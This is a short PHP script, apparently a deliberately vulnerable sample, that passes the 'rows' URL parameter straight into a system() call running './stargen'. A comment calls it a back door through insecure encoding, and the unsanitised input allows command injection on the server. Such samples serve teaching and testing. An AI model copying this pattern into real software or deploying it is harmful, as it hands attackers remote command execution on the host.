<pre><?
// $cmd="./stargen 10";
// system($cmd);
//openening back door through insecure encoding
if($_GET['rows']){
    $rows=$_GET['rows'];
    $cmd="./stargen $rows";
    system($cmd);
}else{
    print("paramter not specified");
}
?>
</pre>